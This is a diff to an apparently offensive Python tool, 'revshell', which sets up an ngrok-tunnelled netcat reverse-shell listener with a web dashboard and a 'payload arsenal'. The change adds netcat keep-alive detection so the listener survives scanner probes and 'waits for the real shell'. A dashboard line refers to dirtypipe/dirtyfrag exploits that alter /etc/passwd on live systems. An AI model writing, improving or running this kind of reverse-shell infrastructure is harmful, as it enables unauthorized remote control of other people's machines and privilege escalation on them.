@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ══════════════════════════════════════════════════════════════════
-#   revshell v2.2 — ngrok + netcat reverse shell w/ web dashboard
+#   revshell v2.3 — ngrok + netcat reverse shell w/ web dashboard
 #
 #   author   : madtiger
 #   Telegram : DevidLuice
@@ -27,6 +27,7 @@ import atexit
 import base64
 import json
 import random
+import re
 import shutil
 import signal
 import subprocess
@@ -70,7 +71,7 @@ BANNER = f"""{CYN}{BOLD}
 ██║   ██║██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║██╔══╝   ██╔██╗
 ╚██████╔╝███████╗██║  ██║██║  ██╗╚██████╔╝███████╗██╔╝ ██╗
  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝{RESET}
-      {MAG}author{RESET} : madtiger    {MAG}Telegram{RESET} : DevidLuice    {DIM}v2.2{RESET}
+      {MAG}author{RESET} : madtiger    {MAG}Telegram{RESET} : DevidLuice    {DIM}v2.3{RESET}
 """
 
 # ── shared state (dashboard + monitor) ─────────────────────────────
@@ -465,7 +466,7 @@ footer{text-align:center;color:var(--dim);margin-top:54px;letter-spacing:3px;fon
   <div class="tips">// authorized targets only · dirtypipe / dirtyfrag modify page cache + /etc/passwd on live systems</div>
   </section>
 
-  <footer>revshell v2.2 · madtiger · telegram : DevidLuice</footer>
+  <footer>revshell v2.3 · madtiger · telegram : DevidLuice</footer>
 </main>
 <script>
 const DATA = __DATA__;
@@ -631,7 +632,7 @@ def main():
         ap.print_help()
         return
 
-    for line in ("initializing revshell v2.2 ...",
+    for line in ("initializing revshell v2.3 ...",
                  "loading payload arsenal ...",
                  "arming local dashboard ..."):
         info(line)
@@ -647,7 +648,20 @@ def main():
     if not nc_bin:
         die("netcat not found — install nc / ncat")
 
-    ev("revshell v2.2 started — by madtiger")
+    # keep-listening netcat: scanner probes hit ngrok endpoints within
+    # seconds and a one-shot nc dies on the first disconnect
+    nc_keep = []
+    try:
+        h = subprocess.run([nc_bin, "-h"], capture_output=True, timeout=5)
+        opts = (h.stdout + h.stderr).decode(errors="ignore")
+        if re.search(r"\[[^\]]*k", opts) or " -k" in opts:
+            nc_keep = ["-k"]
+    except Exception:
+        pass
+    if nc_keep:
+        info(f"listener     : {WHT}{nc_bin} -k{RESET} {DIM}(survives probe scans, waits for the real shell){RESET}")
+
+    ev("revshell v2.3 started — by madtiger")
     info(f"local port   : {WHT}{port}{RESET}")
     info("starting ngrok tcp tunnel ...")
 
@@ -690,7 +704,7 @@ def main():
     listening_box(host, pub, port, web_url)
 
     try:
-        nc = subprocess.Popen([nc_bin, "-lnvp", str(port)])
+        nc = subprocess.Popen([nc_bin] + nc_keep + ["-lnvp", str(port)])
         STATE["nc"] = nc
         nc.wait()
     except KeyboardInterrupt:
